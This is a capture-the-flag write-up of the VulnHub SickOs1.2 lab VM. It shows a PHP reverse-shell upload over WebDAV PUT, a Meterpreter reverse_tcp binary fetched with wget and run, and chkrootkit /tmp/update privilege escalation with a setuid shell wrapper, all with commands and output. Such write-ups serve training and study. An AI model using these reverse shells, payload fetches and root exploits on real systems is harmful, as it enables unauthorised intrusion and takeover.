## SickOs1.2

### info

```
About Release

Name........: SickOs1.2
Date Release: 26 Apr 2016
Author......: D4rk
Series......: SickOs
Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
Tester(s)...: h1tch1, Eagle11
Twitter.....: https://twitter.com/D4rk36

Description:-

This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.

https://www.vulnhub.com/entry/sickos-12,144/
```

### discovery

```bash
root@kali:~# netdiscover -r 192.168.93.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.139  00:0c:29:ad:6d:84      1      60  VMware, Inc.
 192.168.93.254  00:50:56:e3:39:c3      1      60  VMware, Inc.

```

### nmap scan

```bash
root@kali:~# nmap -sV -sC -p- 192.168.93.139

Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-24 10:25 BST
Nmap scan report for 192.168.93.139
Host is up (0.00075s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:AD:6D:84 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.38 seconds
```

### port 80

```bash
root@kali:~# gobuster -w /opt/SecLists/Discovery/Web_Content/common.txt -u http://192.168.93.139/

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.93.139/
[+] Threads      : 10
[+] Wordlist     : /opt/SecLists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/index.php (Status: 200)
/test (Status: 301)
=====================================================
```

```bash
root@kali:~# nikto -host http://192.168.93.139/ -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.93.139
+ Target Hostname:    192.168.93.139
+ Target Port:        80
+ Start Time:         2016-07-24 10:31:24 (GMT1)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ 26165 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2016-07-24 10:32:08 (GMT1) (44 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
hmm not a lot to work with, the `/test` directory looks interesting.

checking the options of this directory shows the `PUT` option.
```bash
root@kali:~# curl -v -X OPTIONS http://192.168.93.139/test
*   Trying 192.168.93.139...
* Connected to 192.168.93.139 (192.168.93.139) port 80 (#0)
> OPTIONS /test HTTP/1.1
> Host: 192.168.93.139
> User-Agent: curl/7.47.0
> Accept: */*
>
< HTTP/1.1 301 Moved Permanently
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Location: http://192.168.93.139/test/
< Content-Length: 0
< Date: Sun, 24 Jul 2016 09:40:01 GMT
< Server: lighttpd/1.4.28
<
* Connection #0 to host 192.168.93.139 left intact
```

```bash
root@kali:~# curl -v -X PUT -d "Testing" http://192.168.93.139/test/testing.txt
*   Trying 192.168.93.139...
* Connected to 192.168.93.139 (192.168.93.139) port 80 (#0)
> PUT /test/testing.txt HTTP/1.1
> Host: 192.168.93.139
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 7
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 7 out of 7 bytes
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Sun, 24 Jul 2016 09:42:21 GMT
< Server: lighttpd/1.4.28
<
* Connection #0 to host 192.168.93.139 left intact
```

```bash
root@kali:~# curl http://192.168.93.139/test/testing.txt
Testing
```

we can PUT to the /test directory.

```bash
root@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php .
root@kali:~# vim php-reverse-shell.php
root@kali:~# curl -v --http1.0 --upload-file php-reverse-shell.php --url http://192.168.93.139/test/shell.php
*   Trying 192.168.93.139...
* Connected to 192.168.93.139 (192.168.93.139) port 80 (#0)
> PUT /test/shell.php HTTP/1.0
> Host: 192.168.93.139
> User-Agent: curl/7.47.0
> Accept: */*
> Content-Length: 5495
>
* We are completely uploaded and fine
* HTTP 1.0, assume close after body
< HTTP/1.0 201 Created
< Content-Length: 0
< Connection: close
< Date: Sun, 24 Jul 2016 10:23:30 GMT
< Server: lighttpd/1.4.28
<
* Closing connection 0
```

upload php reverse shell after changing the IP to my kali box and the port to 443. I had to change cURL to use http1.0 for this to be successful

### shell

```bash
root@kali:~# curl http://192.168.93.139/test/shell.php
```

```bash
root@kali:~# ncat -nlvp 443
Ncat: Version 7.12 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.93.139.
Ncat: Connection from 192.168.93.139:50203.
Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 03:25:11 up  1:05,  0 users,  load average: 0.02, 0.02, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$
```

its doing that thing where it displays the echo of inputted commands, oh well i can live with that

```bash
www-data@ubuntu:/$ uunnaammee  --aa

Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux

www-data@ubuntu:/$ llssbb__rreelleeaassee  --aa

No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 12.04.4 LTS
Release:	12.04
Codename:	precise
www-data@ubuntu:/$
```

transfer over our enumeration script this one is here [LinEnum.sh](https://github.com/rebootuser/LinEnum)

```bash
root@kali:~# cp /opt/LinEnum.sh .
root@kali:~# python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
192.168.93.139 - - [24/Jul/2016 11:34:50] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```bash
www-data@ubuntu:/tmp$ wwggeett  hhttttpp::////119922..116688..9933..112288::88008800//LinEnum.shLinEnum.sh

--2016-07-24 03:34:52--  http://192.168.93.128:8080/LinEnum.sh
Connecting to 192.168.93.128:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40155 (39K) [text/x-sh]
Saving to: `LinEnum.sh'

100%[======================================>] 40,155      --.-K/s   in 0s

2016-07-24 03:34:52 (91.3 MB/s) - `LinEnum.sh' saved [40155/40155]

```

interesting results from the script

```bash
Users that have previously logged onto the system:
Username         Port     From             Latest
root             pts/0    192.168.0.100    Tue Apr 26 03:57:15 -0700 2016
john             tty1                      Wed Mar 30 05:09:38 -0700 2016

```

```bash
Sample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:Ubuntu 12.x,,,:/home/john:/bin/bash
```

```bash
Process binaries & associated permissions (from above list):
-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh -> dash
-rwxr-xr-x 2 root root  26696 Mar 29  2012 /sbin/getty
-rwxr-xr-x 1 root root 194528 Jan 18  2013 /sbin/init
-rwxr-xr-x 1 root root 177552 Jul 19  2013 /sbin/udevd
lrwxrwxrwx 1 root root     25 Apr 12 08:41 /usr/bin/php-cgi -> /etc/alternatives/php-cgi
lrwxrwxrwx 1 root root     37 Mar 30 05:04 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin32/appLoader
-rwxr-xr-x 1 root root 187332 Dec 20  2011 /usr/sbin/lighttpd
-rwxr-xr-x 1 root root 531776 Jan 13  2016 /usr/sbin/sshd
lrwxrwxrwx 1 root root     37 Mar 30 05:04 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin32/vmtoolsd
lrwxrwxrwx 1 root root     37 Mar 30 05:04 /usr/sbin/vmware-vmblock-fuse -> /usr/lib/vmware-tools/bin32/appLoader
```
### escalation

hmm nowhere with the above, then i saw this

```bash
www-data@ubuntu:/tmp$ dpkg -l | grep chkrootkit

rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
```

a bit of searching on google showed [this](https://www.itofy.com/news/chkrootkit-vulnerability-privilege-escalation/)

we could be getting somewhere here.

```bash
root@kali:~# searchsploit chkrootkit
-------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/platforms)
-------------------------------------------------------------------------------------------------- ----------------------------------
Chkrootkit 0.49 - Local Root                                                                      | ./linux/local/33899.txt
Chkrootkit - Local Privilege Escalation                                                           | ./linux/local/38775.rb
-------------------------------------------------------------------------------------------------- ----------------------------------
```

```bash
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.
```

```bash
www-data@ubuntu:/tmp$ ccdd  //ttmmpp

www-data@ubuntu:/tmp$ ccaatt  <<<<EEOOFF>>rroooott..cc

> int main(void)int main(void)

> {{

> setgid(0);setgid(0);

> setuid(0);setuid(0);

> execl("/bin/sh", "sh", 0);execl("/bin/sh", "sh", 0);

> }}

> EEOOFF
```

```bash
www-data@ubuntu:/tmp$ ccaatt  ..//rroooott..cc

int main(void)
{
setgid(0);
setuid(0);
execl("/bin/sh", "sh", 0);
}
```
`gcc root.c -o root`

```bash
www-data@ubuntu:/tmp$ ccaatt  <<<<EEOOFF>>uuppddaattee

> ##!!//bbiinn//bbaasshh

> cchhoowwnn  rroooott  //ttmmpp//rroooott

> cchhggrrpp  rroooott  //ttmmpp//rroooott

> cchhmmoodd  uu++ss  //ttmmpp//rroooott

> EEOOFF
```

```bash
www-data@ubuntu:/tmp$ ccaatt  uuppddaattee

#!/bin/bash
chown root /tmp/root
chgrp root /tmp/root
chmod u+s /tmp/root
```

wait for the job to run. while i wait there was an metasploit exploit for chkrootkit. maybe if i get a session i can run this faster.

```ruby
msf payload(reverse_tcp) > show options

Module options (payload/linux/x86/meterpreter/reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   LHOST         192.168.93.128   yes       The listen address
   LPORT         8080               yes       The listen port
```

```ruby
msf payload(reverse_tcp) > generate -f sickos2 -t elf
[*] Writing 155 bytes to sickos2...
```

```bash
$ wget http://192.168.93.128:8080/sickos2
--2016-07-24 04:38:00--  http://192.168.93.128:8080/sickos2
Connecting to 192.168.93.128:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 155 [application/octet-stream]
Saving to: `sickos2'

     0K                                                       100% 21.3M=0s

2016-07-24 04:38:00 (21.3 MB/s) - `sickos2' saved [155/155]

```

```bash
$ chmod +x sickos2
$ ./sickos2
```

```ruby
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.93.128:8080
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.93.139
[*] Meterpreter session 1 opened (192.168.93.128:8080 -> 192.168.93.139:56906) at 2016-07-24 12:38:30 +0100

```

```ruby
msf exploit(chkrootkit) > show options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting       Required  Description
   ----        ---------------       --------  -----------
   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
   SESSION     1                     yes       The session to run this module on.


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.93.128   yes       The listen address
   LPORT  8080             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(chkrootkit) > exploit
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
```

what a donut, i'm waiting for a cron job to run, theres no way to make this go any faster ..

after awhile waiting looks like i have a root shell

```ruby
msf exploit(chkrootkit) >
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo HYIeRN9cDlKjPcYk;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "HYIeRN9cDlKjPcYk\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 2 opened (192.168.93.128:8080 -> 192.168.93.139:57100) at 2016-07-24 14:07:02 +0100
[+] Deleted /tmp/update
```

```bash
msf exploit(chkrootkit) > sessions -i 2
[*] Starting interaction with 2...

2202126706
tlvVgBYRIcVFzOHtbZntOuBWSkUMbBbn
true
fDgdyZNMBNUaqLvJKaAHUlqDMycPpyqY
vKBTfWgldSuuoRkdqWAJPaCHUayKhEDC
EHndDDvvfafKurBoZnknbXNxxpDKZyFM

id
uid=0(root) gid=0(root) groups=0(root)
python -c 'import pty;pty.spawn("/bin/bash")'
root@ubuntu:~# cd
cd
root@ubuntu:~# ls -al
ls -al
total 76
drwx------  4 root root  4096 Apr 26 03:58 .
drwxr-xr-x 22 root root  4096 Mar 30 04:57 ..
-rw-r--r--  1 root root 39421 Apr  9  2015 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
-r--------  1 root root   491 Apr 26 03:58 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
-rw-------  1 root root  3066 Apr 26 04:01 .bash_history
-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc
drwx------  2 root root  4096 Apr 12 08:37 .cache
drwxr-xr-x  2 john john  4096 Apr 12 08:42 chkrootkit-0.49
-rw-r--r--  1 root root   541 Apr 25 22:48 newRule
-rw-r--r--  1 root root   140 Apr 19  2012 .profile
```

### flag

```bash
root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt ; id ; hostname; whoami
<bf93d80040f3f22ec6ad9d5a.txt ; id ; hostname; whoami
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
uid=0(root) gid=0(root) groups=0(root)
ubuntu
root
```
